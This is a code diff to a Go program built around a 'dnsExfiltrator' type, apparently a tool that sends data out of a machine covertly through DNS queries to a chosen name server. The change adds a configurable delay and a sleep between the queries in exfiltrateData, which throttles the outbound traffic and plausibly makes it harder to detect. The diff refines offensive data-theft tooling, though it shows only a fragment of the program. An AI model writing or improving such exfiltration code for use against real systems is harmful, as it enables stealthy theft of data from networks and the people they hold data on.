@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"strings"
+	"time"
 )
 
 const (
@@ -23,9 +24,10 @@ const (
 type dnsExfiltrator struct {
 	nameServer string
 	machineId  string
+	delay      int
 }
 
-func NewDnsExfiltrator(nameServer string, machineId string) *dnsExfiltrator {
+func NewDnsExfiltrator(nameServer string, machineId string, delay int) *dnsExfiltrator {
 	absoluteNameServer := nameServer
 	if nameServer[len(nameServer)-1] != '.' {
 		absoluteNameServer += "."
@@ -33,6 +35,7 @@ func NewDnsExfiltrator(nameServer string, machineId string) *dnsExfiltrator {
 	return &dnsExfiltrator{
 		nameServer: absoluteNameServer,
 		machineId:  machineId,
+		delay:      delay,
 	}
 }
 
@@ -85,6 +88,7 @@ func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string)
 		if err != nil {
 			log.Fatalln(err)
 		}
+		time.Sleep(time.Millisecond * time.Duration(ex.delay))
 	}
 }
 
